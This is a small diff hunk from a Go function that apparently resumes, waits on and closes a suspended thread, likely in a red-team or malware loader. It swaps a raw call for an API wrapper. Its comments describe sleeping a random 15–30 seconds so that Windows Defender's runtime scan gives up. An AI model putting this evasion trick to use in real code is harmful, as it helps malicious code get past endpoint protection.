@@ -263,7 +263,7 @@ func StartThreadWait(api WinAPI, bin BinAPI) (err error) {
 	log.Infof("Waiting a few seconds to trip off any runtime scan")
 	time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
 
-	resumeThread.Call(r1)
+	api.ResumeThread(r1)
 	api.WaitForSingleObject(r1)
 	api.CloseHandle(r1)
 
